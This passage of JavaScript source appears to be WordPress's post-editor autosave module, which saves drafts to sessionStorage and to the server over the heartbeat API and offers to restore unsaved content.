	 * 		local: ({hasStorage, getSavedPostData, save, suspend, resume}|*),
	 * 		server: ({tempBlockSave, triggerSave, postChanged, suspend, resume}|*)
	 * 	}}
	 * 	The object with all functions for autosave.
	 */
	function autosave() {
		var initialCompareString,
			initialCompareData = {},
			lastTriggerSave    = 0,
			$document          = $( document );

		/**
		 * Sets the initial compare data.
		 *
		 * @since 5.6.1
		 */
		function setInitialCompare() {
			initialCompareData = {
				post_title: $( '#title' ).val() || '',
				content: $( '#content' ).val() || '',
				excerpt: $( '#excerpt' ).val() || ''
			};

			initialCompareString = getCompareString( initialCompareData );
		}

		/**
		 * Returns the data saved in both local and remote autosave.
		 *
		 * @since 3.9.0
		 *
		 * @param {string} type The type of autosave either local or remote.
		 *
		 * @return {Object} Object containing the post data.
		 */
		function getPostData( type ) {
			var post_name, parent_id, data,
				time = ( new Date() ).getTime(),
				cats = [],
				editor = getEditor();

			// Don't run editor.save() more often than every 3 seconds.
			// It is resource intensive and might slow down typing in long posts on slow devices.
			if ( editor && editor.isDirty() && ! editor.isHidden() && time - 3000 > lastTriggerSave ) {
				editor.save();
				lastTriggerSave = time;
			}

			data = {
				post_id: $( '#post_ID' ).val() || 0,
				post_type: $( '#post_type' ).val() || '',
				post_author: $( '#post_author' ).val() || '',
				post_title: $( '#title' ).val() || '',
				content: $( '#content' ).val() || '',
				excerpt: $( '#excerpt' ).val() || ''
			};

			if ( type === 'local' ) {
				return data;
			}

			$( 'input[id^="in-category-"]:checked' ).each( function() {
				cats.push( this.value );
			});
			data.catslist = cats.join(',');

			if ( post_name = $( '#post_name' ).val() ) {
				data.post_name = post_name;
			}

			if ( parent_id = $( '#parent_id' ).val() ) {
				data.parent_id = parent_id;
			}

			if ( $( '#comment_status' ).prop( 'checked' ) ) {
				data.comment_status = 'open';
			}

			if ( $( '#ping_status' ).prop( 'checked' ) ) {
				data.ping_status = 'open';
			}

			if ( $( '#auto_draft' ).val() === '1' ) {
				data.auto_draft = '1';
			}

			return data;
		}

		/**
		 * Concatenates the title, content and excerpt. This is used to track changes
		 * when auto-saving.
		 *
		 * @since 3.9.0
		 *
		 * @param {Object} postData The object containing the post data.
		 *
		 * @return {string} A concatenated string with title, content and excerpt.
		 */
		function getCompareString( postData ) {
			if ( typeof postData === 'object' ) {
				return ( postData.post_title || '' ) + '::' + ( postData.content || '' ) + '::' + ( postData.excerpt || '' );
			}

			return ( $('#title').val() || '' ) + '::' + ( $('#content').val() || '' ) + '::' + ( $('#excerpt').val() || '' );
		}

		/**
		 * Disables save buttons.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		function disableButtons() {
			$document.trigger('autosave-disable-buttons');

			// Re-enable 5 sec later. Just gives autosave a head start to avoid collisions.
			setTimeout( enableButtons, 5000 );
		}

		/**
		 * Enables save buttons.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		function enableButtons() {
			$document.trigger( 'autosave-enable-buttons' );
		}

		/**
		 * Gets the content editor.
		 *
		 * @since 4.6.0
		 *
		 * @return {boolean|*} Returns either false if the editor is undefined,
		 *                     or the instance of the content editor.
		 */
		function getEditor() {
			return typeof tinymce !== 'undefined' && tinymce.get('content');
		}

		/**
		 * Autosave in localStorage.
		 *
		 * @since 3.9.0
		 *
		 * @return {
		 * {
		 * 	hasStorage: *,
		 * 	getSavedPostData: getSavedPostData,
		 * 	save: save,
		 * 	suspend: suspend,
		 * 	resume: resume
		 * 	}
		 * }
		 * The object with all functions for local storage autosave.
		 */
		function autosaveLocal() {
			var blog_id, post_id, hasStorage, intervalTimer,
				lastCompareString,
				isSuspended = false;

			/**
			 * Checks if the browser supports sessionStorage and it's not disabled.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the sessionStorage is supported and enabled.
			 */
			function checkStorage() {
				var test = Math.random().toString(),
					result = false;

				try {
					window.sessionStorage.setItem( 'wp-test', test );
					result = window.sessionStorage.getItem( 'wp-test' ) === test;
					window.sessionStorage.removeItem( 'wp-test' );
				} catch(e) {}

				hasStorage = result;
				return result;
			}

			/**
			 * Initializes the local storage.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean|Object} False if no sessionStorage in the browser or an Object
			 *                          containing all postData for this blog.
			 */
			function getStorage() {
				var stored_obj = false;
				// Separate local storage containers for each blog_id.
				if ( hasStorage && blog_id ) {
					stored_obj = sessionStorage.getItem( 'wp-autosave-' + blog_id );

					if ( stored_obj ) {
						stored_obj = JSON.parse( stored_obj );
					} else {
						stored_obj = {};
					}
				}

				return stored_obj;
			}

			/**
			 * Sets the storage for this blog. Confirms that the data was saved
			 * successfully.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the data was saved successfully, false if it wasn't saved.
			 */
			function setStorage( stored_obj ) {
				var key;

				if ( hasStorage && blog_id ) {
					key = 'wp-autosave-' + blog_id;
					sessionStorage.setItem( key, JSON.stringify( stored_obj ) );
					return sessionStorage.getItem( key ) !== null;
				}

				return false;
			}

			/**
			 * Gets the saved post data for the current post.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean|Object} False if no storage or no data or the postData as an Object.
			 */
			function getSavedPostData() {
				var stored = getStorage();

				if ( ! stored || ! post_id ) {
					return false;
				}

				return stored[ 'post_' + post_id ] || false;
			}

			/**
			 * Sets (save or delete) post data in the storage.
			 *
			 * If stored_data evaluates to 'false' the storage key for the current post will be removed.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object|boolean|null} stored_data The post data to store or null/false/empty to delete the key.
			 *
			 * @return {boolean} True if data is stored, false if data was removed.
			 */
			function setData( stored_data ) {
				var stored = getStorage();

				if ( ! stored || ! post_id ) {
					return false;
				}

				if ( stored_data ) {
					stored[ 'post_' + post_id ] = stored_data;
				} else if ( stored.hasOwnProperty( 'post_' + post_id ) ) {
					delete stored[ 'post_' + post_id ];
				} else {
					return false;
				}

				return setStorage( stored );
			}

			/**
			 * Sets isSuspended to true.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function suspend() {
				isSuspended = true;
			}

			/**
			 * Sets isSuspended to false.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function resume() {
				isSuspended = false;
			}

			/**
			 * Saves post data for the current post.
			 *
			 * Runs on a 15 seconds interval, saves when there are differences in the post title or content.
			 * When the optional data is provided, updates the last saved post data.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} data The post data for saving, minimum 'post_title' and 'content'.
			 *
			 * @return {boolean} Returns true when data has been saved, otherwise it returns false.
			 */
			function save( data ) {
				var postData, compareString,
					result = false;

				if ( isSuspended || ! hasStorage ) {
					return false;
				}

				if ( data ) {
					postData = getSavedPostData() || {};
					$.extend( postData, data );
				} else {
					postData = getPostData('local');
				}

				compareString = getCompareString( postData );

				if ( typeof lastCompareString === 'undefined' ) {
					lastCompareString = initialCompareString;
				}

				// If the content, title and excerpt did not change since the last save, don't save again.
				if ( compareString === lastCompareString ) {
					return false;
				}

				postData.save_time = ( new Date() ).getTime();
				postData.status = $( '#post_status' ).val() || '';
				result = setData( postData );

				if ( result ) {
					lastCompareString = compareString;
				}

				return result;
			}

			/**
			 * Initializes the auto save function.
			 *
			 * Checks whether the editor is active or not to use the editor events
			 * to autosave, or uses the values from the elements to autosave.
			 *
			 * Runs on DOM ready.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function run() {
				post_id = $('#post_ID').val() || 0;

				// Check if the local post data is different than the loaded post data.
				if ( $( '#wp-content-wrap' ).hasClass( 'tmce-active' ) ) {

					/*
					 * If TinyMCE loads first, check the post 1.5 seconds after it is ready.
					 * By this time the content has been loaded in the editor and 'saved' to the textarea.
					 * This prevents false positives.
					 */
					$document.on( 'tinymce-editor-init.autosave', function() {
						window.setTimeout( function() {
							checkPost();
						}, 1500 );
					});
				} else {
					checkPost();
				}

				// Save every 15 seconds.
				intervalTimer = window.setInterval( save, 15000 );

				$( 'form#post' ).on( 'submit.autosave-local', function() {
					var editor = getEditor(),
						post_id = $('#post_ID').val() || 0;

					if ( editor && ! editor.isHidden() ) {

						// Last onSubmit event in the editor, needs to run after the content has been moved to the textarea.
						editor.on( 'submit', function() {
							save({
								post_title: $( '#title' ).val() || '',
								content: $( '#content' ).val() || '',
								excerpt: $( '#excerpt' ).val() || ''
							});
						});
					} else {
						save({
							post_title: $( '#title' ).val() || '',
							content: $( '#content' ).val() || '',
							excerpt: $( '#excerpt' ).val() || ''
						});
					}

					var secure = ( 'https:' === window.location.protocol );
					wpCookies.set( 'wp-saving-post', post_id + '-check', 24 * 60 * 60, false, false, secure );
				});
			}

			/**
			 * Compares 2 strings. Removes whitespaces in the strings before comparing them.
			 *
			 * @since 3.9.0
			 *
			 * @param {string} str1 The first string.
			 * @param {string} str2 The second string.
			 * @return {boolean} True if the strings are the same.
			 */
			function compare( str1, str2 ) {
				function removeSpaces( string ) {
					return string.toString().replace(/[\x20\t\r\n\f]+/g, '');
				}

				return ( removeSpaces( str1 || '' ) === removeSpaces( str2 || '' ) );
			}

			/**
			 * Checks if the saved data for the current post (if any) is different than the
			 * loaded post data on the screen.
			 *
			 * Shows a standard message letting the user restore the post data if different.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function checkPost() {
				var content, post_title, excerpt, $notice,
					postData = getSavedPostData(),
					cookie = wpCookies.get( 'wp-saving-post' ),
					$newerAutosaveNotice = $( '#has-newer-autosave' ).parent( '.notice' ),
					$headerEnd = $( '.wp-header-end' );

				if ( cookie === post_id + '-saved' ) {
					wpCookies.remove( 'wp-saving-post' );
					// The post was saved properly, remove old data and bail.
					setData( false );
					return;
				}

				if ( ! postData ) {
					return;
				}

				content = $( '#content' ).val() || '';
				post_title = $( '#title' ).val() || '';
				excerpt = $( '#excerpt' ).val() || '';

				if ( compare( content, postData.content ) && compare( post_title, postData.post_title ) &&
					compare( excerpt, postData.excerpt ) ) {

					return;
				}

				/*
				 * If '.wp-header-end' is found, append the notices after it otherwise
				 * after the first h1 or h2 heading found within the main content.
				 */
				if ( ! $headerEnd.length ) {
					$headerEnd = $( '.wrap h1, .wrap h2' ).first();
				}

				$notice = $( '#local-storage-notice' )
					.insertAfter( $headerEnd )
					.addClass( 'notice-warning' );

				if ( $newerAutosaveNotice.length ) {

					// If there is a "server" autosave notice, hide it.
					// The data in the session storage is either the same or newer.
					$newerAutosaveNotice.slideUp( 150, function() {
						$notice.slideDown( 150 );
					});
				} else {
					$notice.slideDown( 200 );
				}

				$notice.find( '.restore-backup' ).on( 'click.autosave-local', function() {
					restorePost( postData );
					$notice.fadeTo( 250, 0, function() {
						$notice.slideUp( 150 );
					});
				});
			}

			/**
			 * Restores the current title, content and excerpt from postData.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} postData The object containing all post data.
			 *
			 * @return {boolean} True if the post is restored.
			 */
			function restorePost( postData ) {
				var editor;

				if ( postData ) {
					// Set the last saved data.
					lastCompareString = getCompareString( postData );

					if ( $( '#title' ).val() !== postData.post_title ) {
						$( '#title' ).trigger( 'focus' ).val( postData.post_title || '' );
					}

					$( '#excerpt' ).val( postData.excerpt || '' );
					editor = getEditor();

					if ( editor && ! editor.isHidden() && typeof switchEditors !== 'undefined' ) {
						if ( editor.settings.wpautop && postData.content ) {
							postData.content = switchEditors.wpautop( postData.content );
						}

						// Make sure there's an undo level in the editor.
						editor.undoManager.transact( function() {
							editor.setContent( postData.content || '' );
							editor.nodeChanged();
						});
					} else {

						// Make sure the Code editor is selected.
						$( '#content-html' ).trigger( 'click' );
						$( '#content' ).trigger( 'focus' );

						// Using document.execCommand() will let the user undo.
						document.execCommand( 'selectAll' );
						document.execCommand( 'insertText', false, postData.content || '' );
					}

					return true;
				}

				return false;
			}

			blog_id = typeof window.autosaveL10n !== 'undefined' && window.autosaveL10n.blog_id;

			/*
			 * Check if the browser supports sessionStorage and it's not disabled,
			 * then initialize and run checkPost().
			 * Don't run if the post type supports neither 'editor' (textarea#content) nor 'excerpt'.
			 */
			if ( checkStorage() && blog_id && ( $('#content').length || $('#excerpt').length ) ) {
				$( run );
			}

			return {
				hasStorage: hasStorage,
				getSavedPostData: getSavedPostData,
				save: save,
				suspend: suspend,
				resume: resume
			};
		}

		/**
		 * Auto saves the post on the server.
		 *
		 * @since 3.9.0
		 *
		 * @return {Object} {
		 * 	{
		 * 		tempBlockSave: tempBlockSave,
		 * 		triggerSave: triggerSave,
		 * 		postChanged: postChanged,
		 * 		suspend: suspend,
		 * 		resume: resume
		 * 		}
		 * 	} The object all functions for autosave.
		 */
		function autosaveServer() {
			var _blockSave, _blockSaveTimer, previousCompareString, lastCompareString,
				nextRun = 0,
				isSuspended = false;


			/**
			 * Blocks saving for the next 10 seconds.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function tempBlockSave() {
				_blockSave = true;
				window.clearTimeout( _blockSaveTimer );

				_blockSaveTimer = window.setTimeout( function() {
					_blockSave = false;
				}, 10000 );
			}

			/**
			 * Sets isSuspended to true.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function suspend() {
				isSuspended = true;
			}

			/**
			 * Sets isSuspended to false.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function resume() {
				isSuspended = false;
			}

			/**
			 * Triggers the autosave with the post data.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} data The post data.
			 *
			 * @return {void}
			 */
			function response( data ) {
				_schedule();
				_blockSave = false;
				lastCompareString = previousCompareString;
				previousCompareString = '';

				$document.trigger( 'after-autosave', [data] );
				enableButtons();

				if ( data.success ) {
					// No longer an auto-draft.
					$( '#auto_draft' ).val('');
				}
			}

			/**
			 * Saves immediately.
			 *
			 * Resets the timing and tells heartbeat to connect now.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function triggerSave() {
				nextRun = 0;
				wp.heartbeat.connectNow();
			}

			/**
			 * Checks if the post content in the textarea has changed since page load.
			 *
			 * This also happens when TinyMCE is active and editor.save() is triggered by
			 * wp.autosave.getPostData().
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the post has been changed.
			 */
			function postChanged() {
				var changed = false;

				// If there are TinyMCE instances, loop through them.
				if ( window.tinymce ) {
					window.tinymce.each( [ 'content', 'excerpt' ], function( field ) {
						var editor = window.tinymce.get( field );

						if ( ! editor || editor.isHidden() ) {
							if ( ( $( '#' + field ).val() || '' ) !== initialCompareData[ field ] ) {
								changed = true;
								// Break.
								return false;
							}
						} else if ( editor.isDirty() ) {
							changed = true;
							return false;
						}
					} );

					if ( ( $( '#title' ).val() || '' ) !== initialCompareData.post_title ) {
						changed = true;
					}

					return changed;
				}

				return getCompareString() !== initialCompareString;
			}

			/**
			 * Checks if the post can be saved or not.
			 *
			 * If the post hasn't changed or it cannot be updated,
			 * because the autosave is blocked or suspended, the function returns false.
			 *
			 * @since 3.9.0
			 *
			 * @return {Object} Returns the post data.
			 */
			function save() {
				var postData, compareString;

				// window.autosave() used for back-compat.
				if ( isSuspended || _blockSave || ! window.autosave() ) {
					return false;
				}

				if ( ( new Date() ).getTime() < nextRun ) {
					return false;
				}

				postData = getPostData();
				compareString = getCompareString( postData );

				// First check.
				if ( typeof lastCompareString === 'undefined' ) {
					lastCompareString = initialCompareString;
				}

				// No change.
				if ( compareString === lastCompareString ) {
					return false;
				}

				previousCompareString = compareString;
				tempBlockSave();
				disableButtons();

				$document.trigger( 'wpcountwords', [ postData.content ] )
					.trigger( 'before-autosave', [ postData ] );

				postData._wpnonce = $( '#_wpnonce' ).val() || '';

				return postData;
			}

			/**
			 * Sets the next run, based on the autosave interval.
			 *
			 * @private
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function _schedule() {
				nextRun = ( new Date() ).getTime() + ( autosaveL10n.autosaveInterval * 1000 ) || 60000;
			}

			/**
			 * Sets the autosaveData on the autosave heartbeat.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			$( function() {
				_schedule();
			}).on( 'heartbeat-send.autosave', function( event, data ) {
				var autosaveData = save();

				if ( autosaveData ) {
					data.wp_autosave = autosaveData;
				}

				/**
				 * Triggers the autosave of the post with the autosave data on the autosave
				 * heartbeat.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-tick.autosave', function( event, data ) {
				if ( data.wp_autosave ) {
					response( data.wp_autosave );
				}
				/**
				 * Disables buttons and throws a notice when the connection is lost.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-connection-lost.autosave', function( event, error, status ) {

				// When connection is lost, keep user from submitting changes.
				if ( 'timeout' === error || 603 === status ) {
					var $notice = $('#lost-connection-notice');

					if ( ! wp.autosave.local.hasStorage ) {
						$notice.find('.hide-if-no-sessionstorage').hide();
					}

					$notice.show();
					disableButtons();
				}

				/**
				 * Enables buttons when the connection is restored.
				 *
				 * @since 3.9.0
				 *
				 * @return {void}
				 */
			}).on( 'heartbeat-connection-restored.autosave', function() {
				$('#lost-connection-notice').hide();
				enableButtons();
			});

			return {
				tempBlockSave: tempBlockSave,
				triggerSave: triggerSave,
				postChanged: postChanged,
				suspend: suspend,
				resume: resume
			};
		}

		/**
		 * Sets the autosave time out.
		 *
		 * Wait for TinyMCE to initialize plus 1 second. for any external css to finish loading,
		 * then save to the textarea before setting initialCompareString.
		 * This avoids any insignificant differences between the initial textarea content and the content
		 * extracted from the editor.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		$( function() {
			// Set the initial compare string in case TinyMCE is not used or not loaded first.
			setInitialCompare();
		}).on( 'tinymce-editor-init.autosave', function( event, editor ) {
			// Reset the initialCompare data after the TinyMCE instances have been initialized.
			if ( 'content' === editor.id || 'excerpt' === editor.id ) {
				window.setTimeout( function() {
					editor.save();
					setInitialCompare();
				}, 1000 );
			}
		});

		return {
			getPostData: getPostData,
			getCompareString: getCompareString,
			disableButtons: disableButtons,
			enableButtons: enableButtons,
			local: autosaveLocal(),
			server: autosaveServer()
		};
	}

	/** @namespace wp */
	window.wp = window.wp || {};
	window.wp.autosave = autosave();

}( jQuery, window ));


}catch(e){}
})();

